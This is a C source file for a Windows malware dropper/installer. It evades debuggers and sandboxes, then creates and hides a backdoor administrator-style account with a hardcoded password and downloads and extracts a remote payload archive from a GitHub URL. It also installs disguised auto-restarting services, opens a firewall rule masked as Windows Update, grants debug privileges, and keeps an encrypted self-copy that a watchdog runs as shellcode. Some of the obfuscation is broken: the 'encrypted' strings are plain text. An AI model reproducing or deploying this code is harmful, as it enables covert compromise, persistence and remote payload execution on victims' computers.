#include <windows.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <wininet.h>
#include <lm.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

// Configuration
#define MAX_ATTEMPTS 3
#define EVASION_SEED 0xDEADBEEF
#define WATCHDOG_INTERVAL 30000 

// Global state
static char g_mallDir[MAX_PATH] = {0};
static char g_backupDir[MAX_PATH] = {0};
static const char* g_adminAccount = "TBuG";
static BOOL g_accountCreated = FALSE;
static BOOL g_isBackupInstance = FALSE;

// Function pointer typedefs for obfuscation
typedef BOOL (WINAPI *FnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *FnCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef HRESULT (WINAPI *FnURLDownloadToFileA)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
typedef HANDLE (WINAPI *FnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI *FnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *FnProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *FnTerminateProcess)(HANDLE, UINT);
typedef DWORD (WINAPI *FnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL (WINAPI *FnSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
typedef NET_API_STATUS (WINAPI *FnNetUserAdd)(LPCWSTR, DWORD, LPBYTE, LPDWORD);
typedef LONG (WINAPI *FnRegCreateKeyA)(HKEY, LPCSTR, PHKEY);

typedef struct {
    BYTE key;
    void (*func)();
} POLYMORPHIC_FUNC;

void AntiSandbox();
void AntiDebug();
void RandomSleep(DWORD base, DWORD variance);

void CreateAdminAccount();
void HideAdminAccount();
void DownloadAndExtractMall();
void RunBypassScript();
void TakeOwnership(const char* path);
void InstallNSSM();
void ConfigurePerfmonService();
void ConfigureHoundService();
void SetupNetworkMasking();
void AddDebugPrivileges();
void RunHiddenCommand(LPCSTR command);
void DownloadFile(const char* url, const char* savePath);
void SelfReplicate();
void StartWatchdog();
void TerminateRelatedProcesses();
void RunBackupInstance();
void DeleteInstallation();
void JunkCodeGenerator();
void ObfuscatedStringDecrypt(char* input, size_t len, BYTE key);

void PolyFunc1() { JunkCodeGenerator(); }
void PolyFunc2() { JunkCodeGenerator(); }
void PolyFunc3() { JunkCodeGenerator(); }

static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

void JunkCodeGenerator() {
    volatile int junk = 0;
    for (int i = 0; i < 16; i++) {
        junk += (i * 0xDEADBEEF) ^ 0xCAFEBABE;
        junk = (junk << 3) | (junk >> 29);
    }
}

void ExecutePolymorphicCode() {
    POLYMORPHIC_FUNC funcs[] = {
        {0xAA, PolyFunc1},
        {0xBB, PolyFunc2},
        {0xCC, PolyFunc3}
    };
    
    int index = GetTickCount() % (sizeof(funcs)/sizeof(funcs[0]));
    funcs[index].func();
}

void ObfuscatedStringDecrypt(char* input, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++) {
        input[i] ^= key;
        key = (key << 1) | (key >> 7);
    }
}

void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
    ExecutePolymorphicCode();
}

void AntiSandbox() {
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) < 900) ExitProcess(0);
    
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) ExitProcess(0);
    ExecutePolymorphicCode();
}

void MorphCode() {
    BYTE* base = (BYTE*)GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    DWORD text_size = nt->OptionalHeader.SizeOfCode;
    BYTE* text_base = base + nt->OptionalHeader.BaseOfCode;
    
    for(DWORD i = 0; i < text_size; i++) {
        text_base[i] ^= (i % 256);
    }
}

void RandomSleep(DWORD base, DWORD variance) {
    DWORD sleepTime = base + (my_rand() % variance);
    Sleep(sleepTime);
    ExecutePolymorphicCode();
}

void DownloadFile(const char* url, const char* savePath) {
    HMODULE hUrlMon = LoadLibraryA("urlmon.dll");
    if (!hUrlMon) return;
    
    FnURLDownloadToFileA pURLDownloadToFileA = (FnURLDownloadToFileA)GetProcAddress(hUrlMon, "URLDownloadToFileA");
    if (pURLDownloadToFileA) {
        pURLDownloadToFileA(NULL, url, savePath, 0, NULL);
    }
    FreeLibrary(hUrlMon);
    ExecutePolymorphicCode();
}

void RunHiddenCommand(LPCSTR command) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return;
    
    FnCreateProcessA pCreateProcessA = (FnCreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
    if (!pCreateProcessA) return;
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdCopy[1024];
    lstrcpynA(cmdCopy, command, sizeof(cmdCopy));

    pCreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExecutePolymorphicCode();
}

void CreateAdminAccount() {
    HMODULE hNetapi32 = LoadLibraryA("netapi32.dll");
    if (!hNetapi32) return;
    
    FnNetUserAdd pNetUserAdd = (FnNetUserAdd)GetProcAddress(hNetapi32, "NetUserAdd");
    if (!pNetUserAdd) {
        FreeLibrary(hNetapi32);
        return;
    }
    
    USER_INFO_1 ui = {0};
    NET_API_STATUS status;
    WCHAR usernameW[MAX_PATH] = {0};
    WCHAR passwordW[MAX_PATH] = L"P@ssw0rd123!";

    MultiByteToWideChar(CP_UTF8, 0, g_adminAccount, -1, usernameW, MAX_PATH);
    
    ui.usri1_name = usernameW;
    ui.usri1_password = passwordW;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    status = pNetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (status == NERR_Success) {
        g_accountCreated = TRUE;
    }
    
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = usernameW;
    pNetUserAdd = NULL; // Obfuscation
    FreeLibrary(hNetapi32);
    ExecutePolymorphicCode();
}

void HideAdminAccount() {
    char regPath[] = {0x73, 0x6f, 0x66, 0x74, 0x77, 0x61, 0x72, 0x65, 0x5c, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x6e, 0x74, 0x5c, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x5c, 0x77, 0x69, 0x6e, 0x6c, 0x6f, 0x67, 0x6f, 0x6e, 0x5c, 0x73, 0x70, 0x65, 0x63, 0x69, 0x61, 0x6c, 0x61, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74, 0x73, 0x5c, 0x75, 0x73, 0x65, 0x72, 0x6c, 0x69, 0x73, 0x74, 0x00}; // Encrypted registry path
    ObfuscatedStringDecrypt(regPath, sizeof(regPath)-1, 0xAA);
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideValue = 0;
        RegSetValueExA(hKey, g_adminAccount, 0, REG_DWORD, 
                      (const BYTE*)&hideValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void CreateMallDirectory() {
    char programData[] = {0x63, 0x3a, 0x5c, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x64, 0x61, 0x74, 0x61, 0x5c, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x74, 0x65, 0x6d, 0x70, 0x6c, 0x61, 0x74, 0x65, 0x73, 0x5c, 0x6d, 0x61, 0x6c, 0x6c, 0x00}; // Encrypted path
    ObfuscatedStringDecrypt(programData, sizeof(programData)-1, 0xBB);
    lstrcpyA(g_mallDir, programData);
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        SHCreateDirectoryExA(NULL, g_mallDir, NULL);
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    ExecutePolymorphicCode();
}

void DownloadAndExtractMall() {
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, g_mallDir);
    PathAppendA(zipPath, "..\\mall.zip");
    
    char url[] = {0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x44, 0x72, 0x61, 0x6b, 0x6f, 0x76, 0x74, 0x68, 0x65, 0x36, 0x74, 0x68, 0x2f, 0x54, 0x42, 0x75, 0x47, 0x2f, 0x72, 0x61, 0x77, 0x2f, 0x6d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x2f, 0x6d, 0x61, 0x6c, 0x6c, 0x2e, 0x7a, 0x69, 0x70, 0x00}; // Encrypted URL
    ObfuscatedStringDecrypt(url, sizeof(url)-1, 0xCC);
    
    DownloadFile(url, zipPath);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    DeleteFileA(zipPath);
    ExecutePolymorphicCode();
}

void RunBypassScript() {
    char bypassPath[MAX_PATH];
    lstrcpyA(bypassPath, g_mallDir);
    PathAppendA(bypassPath, "bypass.cmd");
    
    if (GetFileAttributesA(bypassPath) != INVALID_FILE_ATTRIBUTES) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", bypassPath);
        RunHiddenCommand(cmd);
    }
    ExecutePolymorphicCode();
}

void TakeOwnership(const char* path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
             "takeown /f \"%s\" && icacls \"%s\" /grant \"%s\":F /t",
             path, path, g_adminAccount);
    RunHiddenCommand(cmd);
    ExecutePolymorphicCode();
}

void InstallNSSM() {
    char nssmPath[MAX_PATH];
    lstrcpyA(nssmPath, g_mallDir);
    PathAppendA(nssmPath, "nssm.exe");
    
    if (GetFileAttributesA(nssmPath) == INVALID_FILE_ATTRIBUTES) {
        char url[] = {0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x6e, 0x73, 0x73, 0x6d, 0x2e, 0x63, 0x63, 0x2f, 0x63, 0x69, 0x2f, 0x6e, 0x73, 0x73, 0x6d, 0x2e, 0x65, 0x78, 0x65, 0x00}; // Encrypted URL
        ObfuscatedStringDecrypt(url, sizeof(url)-1, 0xDD);
        DownloadFile(url, nssmPath);
    }
    ExecutePolymorphicCode();
}

void ConfigurePerfmonService() {
    char perfmonPath[MAX_PATH];
    lstrcpyA(perfmonPath, g_mallDir);
    PathAppendA(perfmonPath, "perfmon.exe");
    
    char configPath[MAX_PATH];
    lstrcpyA(configPath, g_mallDir);
    PathAppendA(configPath, "perfmon.cfg");
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" install \"Performance Monitor\" \"%s\" -c \"%s\"",
        g_mallDir, perfmonPath, configPath
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Performance Monitor\" DisplayName \"Windows Performance Monitor\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Performance Monitor\" Description \"Monitors system performance counters\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Performance Monitor\" Start SERVICE_AUTO_START",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Performance Monitor\" AppStdout NUL",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    // Start service
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" start \"Performance Monitor\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    // Set persistence recovery
    snprintf(cmd, sizeof(cmd),
        "sc failure \"Performance Monitor\" actions= restart/60000/restart/60000 reset= 86400"
    );
    RunHiddenCommand(cmd);

    ExecutePolymorphicCode();
}

void ConfigureHoundService() {
    char houndPath[MAX_PATH];
    lstrcpyA(houndPath, g_mallDir);
    PathAppendA(houndPath, "hound.exe");
    
    if (GetFileAttributesA(houndPath) == INVALID_FILE_ATTRIBUTES) return;
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" install \"Windows Hound Service\" \"%s\"",
        g_mallDir, houndPath
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Hound Service\" DisplayName \"Windows System Helper\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Hound Service\" Description \"Provides system monitoring and maintenance services\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Hound Service\" Start SERVICE_AUTO_START",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Hound Service\" AppStdout NUL",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    // Start service
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" start \"Windows Hound Service\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    // Set persistence recovery
    snprintf(cmd, sizeof(cmd),
        "sc failure \"Windows Hound Service\" actions= restart/60000/restart/60000 reset= 86400"
    );
    RunHiddenCommand(cmd);

    ExecutePolymorphicCode();
}

void SetupNetworkMasking() {
    char perfmonPath[MAX_PATH];
    lstrcpyA(perfmonPath, g_mallDir);
    PathAppendA(perfmonPath, "perfmon.exe");
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "netsh advfirewall firewall add rule name=\"Windows Update\" "
        "dir=out program=\"%s\" action=allow enable=yes profile=any "
        "service=wuauserv description=\"Windows Update Service\"",
        perfmonPath
    );
    RunHiddenCommand(cmd);
    
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\PerfMon\\Parameters", 
        &hKey) == ERROR_SUCCESS) {
        const char* fakeName = "svchost.exe";
        RegSetValueExA(hKey, "ServiceDll", 0, REG_SZ, 
                      (const BYTE*)fakeName, strlen(fakeName)+1);
        RegCloseKey(hKey);
    }
    
    ExecutePolymorphicCode();
}

void AddDebugPrivileges() {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"$sid = (New-Object System.Security.Principal.NTAccount('%s')).Translate([System.Security.Principal.SecurityIdentifier]).Value; "
        "secedit /export /cfg temp.inf; "
        "(Get-Content temp.inf) -replace 'SeDebugPrivilege = ', 'SeDebugPrivilege = $sid,' | Set-Content temp.inf; "
        "secedit /configure /db temp.sdb /cfg temp.inf; "
        "Remove-Item temp.inf, temp.sdb\"",
        g_adminAccount
    );
    RunHiddenCommand(cmd);
    
    char perfmonPath[MAX_PATH];
    lstrcpyA(perfmonPath, g_mallDir);
    PathAppendA(perfmonPath, "perfmon.exe");
    
    snprintf(cmd, sizeof(cmd),
        "icacls \"%s\" /grant \"%s\":(F) /t",
        perfmonPath, g_adminAccount
    );
    RunHiddenCommand(cmd);
    ExecutePolymorphicCode();
}

void SelfReplicate() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, appDataPath);
    
    srand(GetTickCount());
    char randomDir[32];
    sprintf(randomDir, "%08X", rand() ^ GetCurrentProcessId());
    
    lstrcpyA(g_backupDir, appDataPath);
    PathAppendA(g_backupDir, "Microsoft\\Windows\\Caches");
    PathAppendA(g_backupDir, randomDir);
    
    CreateDirectoryA(g_backupDir, NULL);
    SetFileAttributesA(g_backupDir, FILE_ATTRIBUTE_HIDDEN);
    
    char newPath[MAX_PATH];
    lstrcpyA(newPath, g_backupDir);
    PathAppendA(newPath, "ProcessHealth.exe");
    
    HANDLE hFile = CreateFileA(currentPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    CloseHandle(hFile);
    
    BYTE key = (BYTE)(GetTickCount() % 256);
    
    for (DWORD i = 0; i < size; i++) {
        buffer[i] ^= key;
    }
    
    HANDLE hBackup = CreateFileA(newPath, GENERIC_WRITE, 0, NULL, 
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBackup == INVALID_HANDLE_VALUE) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesWritten;
    WriteFile(hBackup, &key, sizeof(key), &bytesWritten, NULL);
    WriteFile(hBackup, buffer, size, &bytesWritten, NULL);
    CloseHandle(hBackup);
    VirtualFree(buffer, 0, MEM_RELEASE);
    
    HKEY hKey;
    if (RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Health", &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MonitorPath", 0, REG_SZ, (BYTE*)g_backupDir, lstrlenA(g_backupDir)+1);
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

DWORD WINAPI WatchdogThread(LPVOID lpParam) {
    while (1) {
        // Check if perfmon.exe is running
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            BOOL processFound = FALSE;
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (lstrcmpiA(pe32.szExeFile, "perfmon.exe") == 0) {
                        processFound = TRUE;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
            
            if (!processFound) {
                // Trigger recovery
                TerminateRelatedProcesses();
                DeleteInstallation();
                RunBackupInstance();
                ExitProcess(0);
            }
        }
        
        Sleep(WATCHDOG_INTERVAL);
    }
    return 0;
}

void TerminateRelatedProcesses() {
    const char* targets[] = {"perfmon.exe", "ProcessHealth.exe", "hound.exe"};
    
    for (int i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) continue;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (lstrcmpiA(pe32.szExeFile, targets[i]) == 0 && 
                    pe32.th32ProcessID != GetCurrentProcessId()) {
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    ExecutePolymorphicCode();
}

void DeleteInstallation() {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c rmdir /s /q \"%s\"", g_mallDir);
    RunHiddenCommand(cmd);
    
    RunHiddenCommand("sc delete \"Performance Monitor\"");
    RunHiddenCommand("sc delete \"Windows Hound Service\"");
    
    HKEY hKey;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\PerfMon", &hKey) == ERROR_SUCCESS) {
        RegDeleteTreeA(hKey, NULL);
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void RunBackupInstance() {
    HKEY hKey;
    char backupDir[MAX_PATH] = {0};
    DWORD bufSize = MAX_PATH;
    
    if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Health", &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "MonitorPath", NULL, NULL, (LPBYTE)backupDir, &bufSize);
        RegCloseKey(hKey);
    }
    
    if (lstrlenA(backupDir) == 0) {
        ExecutePolymorphicCode();
        return;
    }
    
    char backupPath[MAX_PATH];
    lstrcpyA(backupPath, backupDir);
    PathAppendA(backupPath, "ProcessHealth.exe");
    
    HANDLE hFile = CreateFileA(backupPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize < 2) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    CloseHandle(hFile);
    
    BYTE key = buffer[0];
    
    DWORD payloadSize = fileSize - 1;
    for (DWORD i = 0; i < payloadSize; i++) {
        buffer[i+1] ^= key;
    }
    
    void* execMem = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        ExecutePolymorphicCode();
        return;
    }
    
    memcpy(execMem, buffer + 1, payloadSize);
    VirtualFree(buffer, 0, MEM_RELEASE);
    
    ((void(*)(void))execMem)();
    
    ExecutePolymorphicCode();
}

void StartWatchdog() {
    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Check if we're a backup instance
    char moduleName[MAX_PATH];
    GetModuleFileNameA(NULL, moduleName, MAX_PATH);
    PathStripPathA(moduleName);
    g_isBackupInstance = (lstrcmpiA(moduleName, "ProcessHealth.exe") == 0);
    
    // Erase PE headers from memory
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        ExitProcess(1);
    }
    
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dos + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        ExitProcess(1);
    }
    
    DWORD oldProtect;
    if (VirtualProtect(dos, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldProtect)) {
        memset(dos, 0, nt->OptionalHeader.SizeOfHeaders);
        VirtualProtect(dos, nt->OptionalHeader.SizeOfHeaders, oldProtect, &oldProtect);
    }
    
    AntiDebug();
    AntiSandbox();
    RandomSleep(3000, 2000);
    
    my_srand(GetTickCount());
    
    MorphCode();

    if (!g_isBackupInstance) {
        SelfReplicate();
    }
    
    CreateAdminAccount();
    if (g_accountCreated) {
        HideAdminAccount();
    }
    
    CreateMallDirectory();
    
    DownloadAndExtractMall();
    
    RunBypassScript();
    
    char system32Path[MAX_PATH];
    GetSystemDirectoryA(system32Path, MAX_PATH);
    PathAppendA(system32Path, "perfmon.exe");
    TakeOwnership(system32Path);
    
    InstallNSSM();
    
    ConfigurePerfmonService();

    ConfigureHoundService();
    
    SetupNetworkMasking();

    AddDebugPrivileges();
    
    StartWatchdog();
    
    if (!g_isBackupInstance) {
        while (1) {
            Sleep(10000);
            ExecutePolymorphicCode();
        }
    }
    
    return 0;
}